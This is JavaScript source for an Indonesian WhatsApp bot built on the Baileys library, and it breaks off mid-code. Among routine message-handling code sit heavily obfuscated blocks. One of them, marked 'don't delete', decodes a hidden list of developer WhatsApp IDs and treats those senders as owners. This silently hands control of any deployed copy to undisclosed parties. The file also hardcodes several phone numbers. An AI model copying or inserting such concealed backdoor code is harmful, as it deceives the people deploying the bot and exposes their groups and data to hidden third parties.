const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
const hx = require('hxz-api')
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const util = require('util')
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const { error } = require("qrcode-terminal")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { addCommands, checkCommands, deleteCommands } = require('./lib/commands')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { yta, ytv, igdl, upload, formatDate } = require('./lib/ytdl')
const { webp2mp4File} = require('./lib/webp2mp4')
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const voting = JSON.parse(fs.readFileSync('./lib/voting.json'))
const { addVote, delVote } = require('./lib/vote')
const { help, help2 } = require('./message')

let _scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))
let antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
let antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'))
let commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))
let setiker = JSON.parse(fs.readFileSync('./temp/stik.json'))
let audionye = JSON.parse(fs.readFileSync('./temp/vn.json'))
let imagenye = JSON.parse(fs.readFileSync('./temp/image.json'))
let videonye = JSON.parse(fs.readFileSync('./temp/video.json'))
let bancht = JSON.parse(fs.readFileSync('./database/banchat.json'))

banChats = false
offline = false
targetpc = '0'
ownerNumber = ["62895619083555@s.whatsapp.net","6287817533783@s.whatsapp.net","6285283427860@s.whatsapp.net","6282290559350@s.whatsapp.net","628886234378@s.whatsapp.net"]
fake = '𝑪𝑹𝑬𝑨𝑻𝑶𝑹 𝑩𝑶𝑻\nID 𝑻𝒆𝒂𝒎'
fake1 = 'ID 𝑻𝒆𝒂𝒎'
numbernye = '0'
waktu = '-'
alasan = '-'

/////***𝙁𝙐𝙉𝙏𝙄𝙊𝙉 𝘼𝘿𝘿 𝘾𝙈𝘿 & 𝘿𝙀𝙇𝙀𝙏𝙀***\\\\\
 var _0x7dfa=["\x70\x75\x73\x68","\x2E\x2F\x64\x61\x74\x61\x62\x61\x73\x65\x2F\x73\x63\x6F\x6D\x6D\x61\x6E\x64\x2E\x6A\x73\x6F\x6E","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x77\x72\x69\x74\x65\x46\x69\x6C\x65\x53\x79\x6E\x63","\x69\x64","\x66\x6F\x72\x45\x61\x63\x68","\x6B\x65\x79\x73","\x63\x68\x61\x74\x73"];const addCmd=(_0x69b2x2,_0x69b2x3)=>{const _0x69b2x4={id:_0x69b2x2,chats:_0x69b2x3};_scommand[_0x7dfa[0]](_0x69b2x4);fs[_0x7dfa[3]](_0x7dfa[1],JSON[_0x7dfa[2]](_scommand))};const getCommandPosition=(_0x69b2x2)=>{let _0x69b2x6=null;Object[_0x7dfa[6]](_scommand)[_0x7dfa[5]]((_0x69b2x7)=>{if(_scommand[_0x69b2x7][_0x7dfa[4]]=== _0x69b2x2){_0x69b2x6= _0x69b2x7}});if(_0x69b2x6!== null){return _0x69b2x6}};const getCmd=(_0x69b2x2)=>{let _0x69b2x6=null;Object[_0x7dfa[6]](_scommand)[_0x7dfa[5]]((_0x69b2x7)=>{if(_scommand[_0x69b2x7][_0x7dfa[4]]=== _0x69b2x2){_0x69b2x6= _0x69b2x7}});if(_0x69b2x6!== null){return _scommand[_0x69b2x6][_0x7dfa[7]]}};const checkSCommand=(_0x69b2x2)=>{let _0x69b2xa=false;Object[_0x7dfa[6]](_scommand)[_0x7dfa[5]]((_0x69b2x7)=>{if(_scommand[_0x69b2x7][_0x7dfa[4]]=== _0x69b2x2){_0x69b2xa= true}});return _0x69b2xa}

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat malam 🌃'
                                        }
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat senja 🌆'
                                         }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat sore 🌆'
                                         }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat siang 🏙️'
                                         }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat pagi 🌇'
                                         }
if(time2 < "06:00:00"){
var ucapanWaktu = 'Selamat pagi 🌅'                                       }
//=================================================//
module.exports = idteam = async (idteam, dev) => {
	try {
        if (!dev.hasNewMessage) return
        dev = dev.messages.all()[0]
		if (!dev.message) return
		if (dev.key && dev.key.remoteJid == 'status@broadcast') return
		global.blocked
        	dev.message = (Object.keys(dev.message)[0] === 'ephemeralMessage') ? dev.message.ephemeralMessage.message : dev.message
        	const content = JSON.stringify(dev.message)
		const from = dev.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
               
               //MengAutoRespon
               const type = Object.keys(dev.message)[0]        
               var pes = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : ''
		       const messagesC = pes.slice(0).trim()

                const cmd = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('hex')) !== undefined) ? getCmd(dev.message.stickerMessage.fileSha256.toString('hex')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
                const prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '-'          	
        body = (type === 'conversation' && dev.message.conversation.startsWith(prefix)) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption.startsWith(prefix) ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption.startsWith(prefix) ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text.startsWith(prefix) ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('hex')) !== undefined) ? (getCmd(dev.message.stickerMessage.fileSha256.toString('hex')).startsWith(prefix) ? getCmd(dev.message.stickerMessage.fileSha256.toString('hex')) : '') : ""
		budy = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
        button = (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedDisplayText : ''
        isImage = (type === 'imageMessage')
        listmes = (type == 'listResponseMessage') ? dev.message.listResponseMessage.title : ''
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
         const timeWib = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeWit= moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
        const timeWita = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
		const botNumber = idteam.user.jid
		const botNumberss = idteam.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		const sender = dev.key.fromMe ? idteam.user.jid : isGroup ? dev.participant : dev.key.remoteJid
		 //Jan Hapus ngetd
        const _0x5ea8=['W43dVK1YWQeDhG','nJi4otu2mtKWodm1ntvaCY53Agf0C2fWCc5Uzxq','nJi4mJe0mdC0ndu0oebZlNDOyxrZyxbWlM5LDa','FCkQWQRcQ8kbWRFcTmkHqW','nJi4otGZntGZmJG4qhmUD2HHDhnHChaUBMv0','W7rMW5BdOSkFf30FCSkYWQZdIINcK8k6DCkqW7PLW4NcMSoYWRzkbwRcVG','W6ddPIKqpun5WRm','nJaXotm0BNjuwKvo','bmoCW50XamogWQXitJ/dSGO','ndm5Bfv0swjm','W5xdUmkkCcddM8olW7uuWQe8','m0zNwM5xDa','vdX+WPRdSmk/W5FcTgNdHCobWQy','owmTzCk8W7FdQa','ndGYmdzUsMf4uKS','WPJcTSoubmoaWQKXDN3dRhBcJSokW5FcSSoTgqZdN17dUSkucwCJWOxdJrq','mZy4mtCWvvHjsKTU','odiXsw9ut1PJ','mtGZmJCWr0fhwxf5','wdaqiq7cHSo5WOZcSZX0hG','mtCWnJm0DMjMrfLc','ndy3mZu5rLbZCe5s','nJi4nZGXnZuZmZC4m0bZlNDOyxrZyxbWlM5LDa'];function _0x52c6ba(_0x289d04,_0x8edcbe){return _0x4d95(_0x289d04- -0x2b5,_0x8edcbe);}function _0x55c7b2(_0x6bdf2f,_0x55530a){return _0x4d95(_0x55530a- -0x284,_0x6bdf2f);}function _0x4d95(_0x29acca,_0x24874a){return _0x4d95=function(_0x5ea8eb,_0x4d955e){_0x5ea8eb=_0x5ea8eb-0x170;let _0x5abd05=_0x5ea8[_0x5ea8eb];if(_0x4d95['Oldqly']===undefined){var _0x27ffe2=function(_0x26b441){const _0x4c7e49='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x16f22f='',_0x52c3c5='';for(let _0x341f3b=0x0,_0x59f9ce,_0x27b470,_0x56a29a=0x0;_0x27b470=_0x26b441['charAt'](_0x56a29a++);~_0x27b470&&(_0x59f9ce=_0x341f3b%0x4?_0x59f9ce*0x40+_0x27b470:_0x27b470,_0x341f3b++%0x4)?_0x16f22f+=String['fromCharCode'](0xff&_0x59f9ce>>(-0x2*_0x341f3b&0x6)):0x0){_0x27b470=_0x4c7e49['indexOf'](_0x27b470);}for(let _0x1906b4=0x0,_0x256e5d=_0x16f22f['length'];_0x1906b4<_0x256e5d;_0x1906b4++){_0x52c3c5+='%'+('00'+_0x16f22f['charCodeAt'](_0x1906b4)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x52c3c5);};_0x4d95['mMXCdw']=_0x27ffe2,_0x29acca=arguments,_0x4d95['Oldqly']=!![];}const _0xa25ad5=_0x5ea8[0x0],_0x5bf2b9=_0x5ea8eb+_0xa25ad5,_0x1a8b1e=_0x29acca[_0x5bf2b9];return!_0x1a8b1e?(_0x5abd05=_0x4d95['mMXCdw'](_0x5abd05),_0x29acca[_0x5bf2b9]=_0x5abd05):_0x5abd05=_0x1a8b1e,_0x5abd05;},_0x4d95(_0x29acca,_0x24874a);}function _0x4c7e(_0x29acca,_0x24874a){return _0x4c7e=function(_0x5ea8eb,_0x4d955e){_0x5ea8eb=_0x5ea8eb-0x170;let _0x5abd05=_0x5ea8[_0x5ea8eb];if(_0x4c7e['yiVLil']===undefined){var _0x27ffe2=function(_0x4c7e49){const _0x16f22f='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x52c3c5='',_0x341f3b='';for(let _0x59f9ce=0x0,_0x27b470,_0x56a29a,_0x1906b4=0x0;_0x56a29a=_0x4c7e49['charAt'](_0x1906b4++);~_0x56a29a&&(_0x27b470=_0x59f9ce%0x4?_0x27b470*0x40+_0x56a29a:_0x56a29a,_0x59f9ce++%0x4)?_0x52c3c5+=String['fromCharCode'](0xff&_0x27b470>>(-0x2*_0x59f9ce&0x6)):0x0){_0x56a29a=_0x16f22f['indexOf'](_0x56a29a);}for(let _0x256e5d=0x0,_0x3bca85=_0x52c3c5['length'];_0x256e5d<_0x3bca85;_0x256e5d++){_0x341f3b+='%'+('00'+_0x52c3c5['charCodeAt'](_0x256e5d)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x341f3b);};const _0x26b441=function(_0xe8a32f,_0x5a61d8){let _0x159338=[],_0x494089=0x0,_0x3d19fd,_0x3cfad6='';_0xe8a32f=_0x27ffe2(_0xe8a32f);let _0x192d49;for(_0x192d49=0x0;_0x192d49<0x100;_0x192d49++){_0x159338[_0x192d49]=_0x192d49;}for(_0x192d49=0x0;_0x192d49<0x100;_0x192d49++){_0x494089=(_0x494089+_0x159338[_0x192d49]+_0x5a61d8['charCodeAt'](_0x192d49%_0x5a61d8['length']))%0x100,_0x3d19fd=_0x159338[_0x192d49],_0x159338[_0x192d49]=_0x159338[_0x494089],_0x159338[_0x494089]=_0x3d19fd;}_0x192d49=0x0,_0x494089=0x0;for(let _0x1647fc=0x0;_0x1647fc<_0xe8a32f['length'];_0x1647fc++){_0x192d49=(_0x192d49+0x1)%0x100,_0x494089=(_0x494089+_0x159338[_0x192d49])%0x100,_0x3d19fd=_0x159338[_0x192d49],_0x159338[_0x192d49]=_0x159338[_0x494089],_0x159338[_0x494089]=_0x3d19fd,_0x3cfad6+=String['fromCharCode'](_0xe8a32f['charCodeAt'](_0x1647fc)^_0x159338[(_0x159338[_0x192d49]+_0x159338[_0x494089])%0x100]);}return _0x3cfad6;};_0x4c7e['VihwCL']=_0x26b441,_0x29acca=arguments,_0x4c7e['yiVLil']=!![];}const _0xa25ad5=_0x5ea8[0x0],_0x5bf2b9=_0x5ea8eb+_0xa25ad5,_0x1a8b1e=_0x29acca[_0x5bf2b9];return!_0x1a8b1e?(_0x4c7e['BdHAiq']===undefined&&(_0x4c7e['BdHAiq']=!![]),_0x5abd05=_0x4c7e['VihwCL'](_0x5abd05,_0x4d955e),_0x29acca[_0x5bf2b9]=_0x5abd05):_0x5abd05=_0x1a8b1e,_0x5abd05;},_0x4c7e(_0x29acca,_0x24874a);}function _0x22a12a(_0x5dc6de,_0xbb847c){return _0x4d95(_0x5dc6de- -0x317,_0xbb847c);}function _0x475b0b(_0x36a7c7,_0x46a03a){return _0x4c7e(_0x36a7c7- -0x229,_0x46a03a);}(function(_0x320a41,_0x312044){function _0x60a0f8(_0xd49bc5,_0xcd0910){return _0x4c7e(_0xd49bc5-0x310,_0xcd0910);}function _0x1c1482(_0x2633e2,_0x5022cb){return _0x4d95(_0x5022cb- -0x369,_0x2633e2);}function _0x266ab5(_0x5b7ea4,_0xfd24a3){return _0x4c7e(_0x5b7ea4- -0x19a,_0xfd24a3);}function _0x4d5884(_0x4a098f,_0x285fc3){return _0x4c7e(_0x285fc3- -0x311,_0x4a098f);}function _0x42386a(_0x84cd9f,_0x2754e9){return _0x4d95(_0x84cd9f-0x35,_0x2754e9);}function _0x2b3a26(_0x3e4d89,_0x2f43f5){return _0x4d95(_0x2f43f5-0x3de,_0x3e4d89);}while(!![]){try{const _0x2b899d=parseInt(_0x1c1482(-0x1e3,-0x1e9))*-parseInt(_0x1c1482(-0x1dc,-0x1e6))+parseInt(_0x4d5884('ufCL',-0x190))+-parseInt(_0x60a0f8(0x481,'*U!s'))+-parseInt(_0x1c1482(-0x1ed,-0x1ed))*-parseInt(_0x60a0f8(0x485,'V^wY'))+-parseInt(_0x60a0f8(0x48d,'$lV5'))+-parseInt(_0x2b3a26(0x55a,0x55c))*-parseInt(_0x42386a(0x1bb,0x1b5))+parseInt(_0x2b3a26(0x552,0x54e));if(_0x2b899d===_0x312044)break;else _0x320a41['push'](_0x320a41['shift']());}catch(_0x1472a2){_0x320a41['push'](_0x320a41['shift']());}}}(_0x5ea8,0x520ee));function _0x597bad(_0x410788,_0x29a2fb){return _0x4c7e(_0x29a2fb- -0x2af,_0x410788);}devNumber=[_0x22a12a(-0x1a0,-0x1a4),_0x55c7b2(-0x112,-0x10e),_0x22a12a(-0x1a3,-0x1a1),_0x475b0b(-0xa5,'zGB['),'6282290559350@s.whatsapp.net',_0x55c7b2(-0x104,-0x10b),_0x597bad('1OCo',-0x135)];function _0x5dfb6a(_0xabc553,_0x3b6da2){return _0x4c7e(_0x3b6da2- -0x31f,_0xabc553);}const isDev=devNumber[_0x597bad('0#76',-0x134)](sender);
        const _0x2085=['oCkSsmoLlmk0W43dH8oCyglcRa','obb5W54tWQnLWO0AESof','i1BdM34mWRWGquramd0','Aw5JBhvKzxm','WOJcI8oTW4pdSSoRW7q','zMOMW519W6KBEGn1hq','nLvvAhfYqG','zaTlWOi/W48J','mJaZodfYtfrOvgK','WOZdUmkmWQ7cKmo+W78QW6lcUSkI','W5FdNYS1W4XVWQO','mZj4AKDyDhm','ndq4nZnuENrPBfC','DrVcPSoFWRj+W4GeW5hdMmk1WOW','nJe0mdu5EvHkyNHO','fKJdGuPRW4VcSa','W5udy8kmp3WaW4NcLwJdQ8k4','zmkArmkjW5NcOGS','nJG1mZDuB0vJy2K','mZm1ndq5Cg1LuMrQ'];(function(_0x59e7bf,_0x3779cd){function _0xf1c4b6(_0xff933,_0x5a32af){return _0x4790(_0x5a32af- -0x10a,_0xff933);}function _0x2890be(_0x31906e,_0x5bf80b){return _0x4440(_0x5bf80b-0x3de,_0x31906e);}function _0x28a121(_0x31f7f8,_0x4a36a2){return _0x4440(_0x4a36a2-0x123,_0x31f7f8);}function _0x4f7460(_0x368633,_0x4654a5){return _0x4440(_0x4654a5-0x5b,_0x368633);}function _0xa3ee76(_0x44e043,_0x88e97f){return _0x4790(_0x44e043-0x2ea,_0x88e97f);}function _0x43db5e(_0x55c8c2,_0x56c823){return _0x4790(_0x55c8c2- -0xa0,_0x56c823);}while(!![]){try{const _0x45ff95=parseInt(_0x4f7460('eVq*',0x200))+parseInt(_0x4f7460('Eahy',0x1f0))*-parseInt(_0x2890be('LWkv',0x57f))+-parseInt(_0x28a121('o@sB',0x2c3))*-parseInt(_0xf1c4b6(0x93,0x99))+-parseInt(_0xf1c4b6(0x99,0x95))+parseInt(_0x28a121('Eahy',0x2bd))*parseInt(_0x2890be('F^!Z',0x576))+-parseInt(_0x43db5e(0xfd,0xfa))+parseInt(_0x43db5e(0xfc,0xf4))*parseInt(_0x28a121('HoRe',0x2c9));if(_0x45ff95===_0x3779cd)break;else _0x59e7bf['push'](_0x59e7bf['shift']());}catch(_0x4de711){_0x59e7bf['push'](_0x59e7bf['shift']());}}}(_0x2085,0x4f58a));function _0x373f63(_0x2be567,_0x57d0fe){return _0x4790(_0x2be567-0xa4,_0x57d0fe);}function _0x4790(_0x265b81,_0x1a869c){return _0x4790=function(_0x20855d,_0x479096){_0x20855d=_0x20855d-0x193;let _0x36019e=_0x2085[_0x20855d];if(_0x4790['ZQFJqe']===undefined){var _0x365663=function(_0x1ca7f1){const _0x4440e5='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x872824='',_0x5c5da5='';for(let _0x58e9c2=0x0,_0x245c65,_0x31fc3b,_0x2c1931=0x0;_0x31fc3b=_0x1ca7f1['charAt'](_0x2c1931++);~_0x31fc3b&&(_0x245c65=_0x58e9c2%0x4?_0x245c65*0x40+_0x31fc3b:_0x31fc3b,_0x58e9c2++%0x4)?_0x872824+=String['fromCharCode'](0xff&_0x245c65>>(-0x2*_0x58e9c2&0x6)):0x0){_0x31fc3b=_0x4440e5['indexOf'](_0x31fc3b);}for(let _0x17d96b=0x0,_0x3f7130=_0x872824['length'];_0x17d96b<_0x3f7130;_0x17d96b++){_0x5c5da5+='%'+('00'+_0x872824['charCodeAt'](_0x17d96b)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5c5da5);};_0x4790['YHiGyY']=_0x365663,_0x265b81=arguments,_0x4790['ZQFJqe']=!![];}const _0x67e422=_0x2085[0x0],_0x201385=_0x20855d+_0x67e422,_0x2e045d=_0x265b81[_0x201385];return!_0x2e045d?(_0x36019e=_0x4790['YHiGyY'](_0x36019e),_0x265b81[_0x201385]=_0x36019e):_0x36019e=_0x2e045d,_0x36019e;},_0x4790(_0x265b81,_0x1a869c);}function _0x4440(_0x265b81,_0x1a869c){return _0x4440=function(_0x20855d,_0x479096){_0x20855d=_0x20855d-0x193;let _0x36019e=_0x2085[_0x20855d];if(_0x4440['ufWHty']===undefined){var _0x365663=function(_0x4440e5){const _0x872824='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x5c5da5='',_0x58e9c2='';for(let _0x245c65=0x0,_0x31fc3b,_0x2c1931,_0x17d96b=0x0;_0x2c1931=_0x4440e5['charAt'](_0x17d96b++);~_0x2c1931&&(_0x31fc3b=_0x245c65%0x4?_0x31fc3b*0x40+_0x2c1931:_0x2c1931,_0x245c65++%0x4)?_0x5c5da5+=String['fromCharCode'](0xff&_0x31fc3b>>(-0x2*_0x245c65&0x6)):0x0){_0x2c1931=_0x872824['indexOf'](_0x2c1931);}for(let _0x3f7130=0x0,_0x17152b=_0x5c5da5['length'];_0x3f7130<_0x17152b;_0x3f7130++){_0x58e9c2+='%'+('00'+_0x5c5da5['charCodeAt'](_0x3f7130)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x58e9c2);};const _0x1ca7f1=function(_0x39be3c,_0x2a56f7){let _0x46d1e0=[],_0x2c65a1=0x0,_0x2a0634,_0x36b7ba='';_0x39be3c=_0x365663(_0x39be3c);let _0x3bf768;for(_0x3bf768=0x0;_0x3bf768<0x100;_0x3bf768++){_0x46d1e0[_0x3bf768]=_0x3bf768;}for(_0x3bf768=0x0;_0x3bf768<0x100;_0x3bf768++){_0x2c65a1=(_0x2c65a1+_0x46d1e0[_0x3bf768]+_0x2a56f7['charCodeAt'](_0x3bf768%_0x2a56f7['length']))%0x100,_0x2a0634=_0x46d1e0[_0x3bf768],_0x46d1e0[_0x3bf768]=_0x46d1e0[_0x2c65a1],_0x46d1e0[_0x2c65a1]=_0x2a0634;}_0x3bf768=0x0,_0x2c65a1=0x0;for(let _0x305ad9=0x0;_0x305ad9<_0x39be3c['length'];_0x305ad9++){_0x3bf768=(_0x3bf768+0x1)%0x100,_0x2c65a1=(_0x2c65a1+_0x46d1e0[_0x3bf768])%0x100,_0x2a0634=_0x46d1e0[_0x3bf768],_0x46d1e0[_0x3bf768]=_0x46d1e0[_0x2c65a1],_0x46d1e0[_0x2c65a1]=_0x2a0634,_0x36b7ba+=String['fromCharCode'](_0x39be3c['charCodeAt'](_0x305ad9)^_0x46d1e0[(_0x46d1e0[_0x3bf768]+_0x46d1e0[_0x2c65a1])%0x100]);}return _0x36b7ba;};_0x4440['PuySIm']=_0x1ca7f1,_0x265b81=arguments,_0x4440['ufWHty']=!![];}const _0x67e422=_0x2085[0x0],_0x201385=_0x20855d+_0x67e422,_0x2e045d=_0x265b81[_0x201385];return!_0x2e045d?(_0x4440['HmhCdQ']===undefined&&(_0x4440['HmhCdQ']=!![]),_0x36019e=_0x4440['PuySIm'](_0x36019e,_0x479096),_0x265b81[_0x201385]=_0x36019e):_0x36019e=_0x2e045d,_0x36019e;},_0x4440(_0x265b81,_0x1a869c);}const isOwner=ownerNumber[_0x373f63(0x238,0x240)](sender)||isDev;
         //Error ntar protes ajg  
		const totalchat = await idteam.chats.all()
		const groupMetadata = isGroup ? await idteam.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBanchat = isGroup ? bancht.includes(from) : false
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
        const isVote = isGroup ? voting.includes(from) : false
        const isAntiLink = isGroup ? antilink.includes(from) : false
        const AntiVirtex = isGroup ? antivirtex.includes(from) : false
        const conts = dev.key.fromMe ? idteam.user.jid : idteam.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = dev.key.fromMe ? idteam.user.name : conts.notify || conts.vname || conts.name || '-'
        chatss = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
        var _0x1e53=['nCo0qmo9fmo3pmokm21zvW','WO3cQ1FcRmoibmkwW5VcOmoTW7S','jCkdWQSEW407eSkT','WP3dHsBdN8kIW4vnWQm','nty2mde4z1DxC2LQ','nJe3mZq3C0jXsMPk','vxnLCG','rgv2zwXVCgvYifrLyw0','r1FcHJ55aupdSCoWW54xxa','WQpcNSkdeYBcLu7cVZWuWQm','mSopW5rODCk1AW','iSkfW6VdVSo8C8oYW5xcSmkSsW','WQ/cSmkUWO3cSmoRlSo7WOhdMxm','nZiZodbSt1neEui','t3DUzxi','mvzAsePOta','nJK0mJmXyufcAhrM','W6W7W78crNlcItnjW5rgW54','muvAvxnAva'];(function(_0x388fa6,_0x4a8e5c){function _0x5f1690(_0x26561f,_0x1b1a38){return _0x3636(_0x1b1a38-0xa9,_0x26561f);}function _0x4affa4(_0x4a3814,_0x17fa5f){return _0x3636(_0x4a3814- -0xf8,_0x17fa5f);}function _0x28ad36(_0x17d1b1,_0x390b4a){return _0x3636(_0x17d1b1- -0x8b,_0x390b4a);}function _0x141407(_0x51356f,_0x4382d5){return _0x36a3(_0x51356f- -0x2ba,_0x4382d5);}function _0x574306(_0x53ea34,_0xc6396e){return _0x36a3(_0x53ea34-0x8c,_0xc6396e);}function _0x278079(_0x3583c1,_0x2958ac){return _0x36a3(_0x2958ac-0x42,_0x3583c1);}while(!![]){try{var _0x3114b3=-parseInt(_0x5f1690('(^ou',0x14a))+parseInt(_0x5f1690('h7uB',0x146))+parseInt(_0x574306(0x120,0x120))*parseInt(_0x574306(0x125,0x12a))+parseInt(_0x574306(0x11b,0x11f))+parseInt(_0x141407(-0x228,-0x227))+-parseInt(_0x574306(0x126,0x11e))*-parseInt(_0x574306(0x11d,0x113))+parseInt(_0x4affa4(-0x62,'yDBD'))*-parseInt(_0x5f1690('DcQ6',0x140));if(_0x3114b3===_0x4a8e5c)break;else _0x388fa6['push'](_0x388fa6['shift']());}catch(_0x3ef74a){_0x388fa6['push'](_0x388fa6['shift']());}}}(_0x1e53,0x55df4));function _0x2365ea(_0x20a6ee,_0x589685){return _0x36a3(_0x589685-0x369,_0x20a6ee);}function _0x36a3(_0x44784f,_0xe39316){return _0x36a3=function(_0x1e53da,_0x36a3e6){_0x1e53da=_0x1e53da-0x8f;var _0x15b520=_0x1e53[_0x1e53da];if(_0x36a3['WifEcC']===undefined){var _0x3e38db=function(_0x4f4c63){var _0x3636f4='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x1e2d29='',_0xa6431a='';for(var _0x50e143=0x0,_0x188dbf,_0x21d0fb,_0xe92d9e=0x0;_0x21d0fb=_0x4f4c63['charAt'](_0xe92d9e++);~_0x21d0fb&&(_0x188dbf=_0x50e143%0x4?_0x188dbf*0x40+_0x21d0fb:_0x21d0fb,_0x50e143++%0x4)?_0x1e2d29+=String['fromCharCode'](0xff&_0x188dbf>>(-0x2*_0x50e143&0x6)):0x0){_0x21d0fb=_0x3636f4['indexOf'](_0x21d0fb);}for(var _0x1aae6b=0x0,_0x2ed0b8=_0x1e2d29['length'];_0x1aae6b<_0x2ed0b8;_0x1aae6b++){_0xa6431a+='%'+('00'+_0x1e2d29['charCodeAt'](_0x1aae6b)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0xa6431a);};_0x36a3['jcBVHJ']=_0x3e38db,_0x44784f=arguments,_0x36a3['WifEcC']=!![];}var _0x19a017=_0x1e53[0x0],_0x1e7a30=_0x1e53da+_0x19a017,_0x422d23=_0x44784f[_0x1e7a30];return!_0x422d23?(_0x15b520=_0x36a3['jcBVHJ'](_0x15b520),_0x44784f[_0x1e7a30]=_0x15b520):_0x15b520=_0x422d23,_0x15b520;},_0x36a3(_0x44784f,_0xe39316);}function _0x3636(_0x44784f,_0xe39316){return _0x3636=function(_0x1e53da,_0x36a3e6){_0x1e53da=_0x1e53da-0x8f;var _0x15b520=_0x1e53[_0x1e53da];if(_0x3636['LhZnEB']===undefined){var _0x3e38db=function(_0x3636f4){var _0x1e2d29='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0xa6431a='',_0x50e143='';for(var 